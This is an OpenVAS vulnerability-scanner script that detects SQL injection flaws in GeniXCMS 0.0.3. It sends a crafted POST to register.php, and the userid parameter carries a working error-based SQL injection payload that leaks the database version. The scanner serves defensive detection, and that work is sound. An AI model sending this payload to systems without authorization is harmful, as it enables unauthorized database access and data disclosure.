###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_genixcms_mult_sql_vuln_jun15.nasl 11445 2018-09-18 08:09:39Z mmartin $
#
# Genixcms Multiple SQL Injection Vulnerabilities - June15
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805665");
  script_version("$Revision: 11445 $");
  script_cve_id("CVE-2015-3933", "CVE-2015-5066");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-18 10:09:39 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-06-25 15:38:34 +0530 (Thu, 25 Jun 2015)");
  script_name("Genixcms Multiple SQL Injection Vulnerabilities - June15");

  script_tag(name:"summary", value:"This host is installed with Genixcms and is
  prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws exists due to,

  - Insufficient validation of input passed via 'email' and 'userid' POST
  parameter to 'register.php' script.

  - Insufficient validation of input passed via 'content' and 'title' fields in
  an add action in the posts page to index.php or the 'q' parameter in the posts
  page to index.php");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data and to inject
  arbitrary web script or HTML.");

  script_tag(name:"affected", value:"Genixcms version 0.0.3");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37363/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37360/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name( port:http_port );

foreach dir (make_list_unique("/", "/genixcms", "/cms", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if('content="GeniXCMS"' >< rcvRes && 'Free and Opensource CMS">GeniXCMS' >< rcvRes)
  {
    url = dir + "/register.php";
    postData = 'userid=%27and%28select%25201%2520from%2520%28select%2520count%28*'+
               '%29%2Cconcat%28version%28%29%2CSQL-Injection-Test%3Cfloor'+
               '%28rand%280%29*2%29%29x%2520from%2520information_schema.tables%25'+
               '20group%2520by%2520x%29a%29and%27&pass1=df&pass2=df&email=asp%40'+
               'gmail.com&register=&token=0jAU0NqrtJGyZj2epsa2GYG6cVlU5dKsKnyzkIY'+
               'qBhY0wy8TpQYtZbf32yAi1R3X3L6jA2c64CK3cF1a';

    sndReq =  string('POST ', url, ' HTTP/1.1\r\n',
                     'Host: ', host, '\r\n',
                     'Accept-Encoding: gzip,deflate\r\n',
                     'Content-Type: application/x-www-form-urlencoded\r\n',
                     'Content-Length: ', strlen(postData), '\r\n\r\n',
                     postData);
    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    if("SQL-Injection-Test<" >< rcvRes &&
       "You have an error in your SQL syntax" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
